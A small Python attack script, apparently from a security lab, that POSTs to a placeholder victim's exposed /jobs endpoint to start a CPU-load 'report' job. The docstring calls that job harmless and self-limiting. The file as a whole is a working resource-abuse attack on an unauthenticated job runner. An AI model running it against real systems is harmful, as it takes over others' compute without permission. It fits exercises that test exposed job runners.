"""Start the harmless CPU-load "report" job on the victim through its exposed job runner.

Usage: python attack.py --target https://<victim-url>
Stdlib only. The job is a pure-arithmetic loop that stops itself after 10 minutes.
"""
import argparse
import json
import urllib.error
import urllib.request


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--target", required=True, help="victim base URL")
    parser.add_argument("--job", default="report")
    args = parser.parse_args()

    req = urllib.request.Request(
        args.target.rstrip("/") + "/jobs",
        data=json.dumps({"job": args.job}).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            print(resp.status, resp.read().decode())
    except urllib.error.HTTPError as exc:
        print(exc.code, exc.read().decode())


if __name__ == "__main__":
    main()
